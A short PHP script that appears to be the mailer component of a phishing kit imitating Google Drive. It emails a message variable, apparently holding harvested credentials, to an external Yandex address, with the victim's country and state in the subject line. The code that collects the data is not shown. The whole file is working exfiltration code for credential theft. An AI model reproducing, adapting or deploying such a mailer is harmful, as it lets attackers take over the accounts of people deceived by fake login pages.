<?php

$to = "davidpeeples@yandex.com";
$subject = "G&Drive 1st $country | $state";
$from = "From: Gdrive<davidpeeples@yandex.com>";

mail($to,$subject,$msg,$from);

?>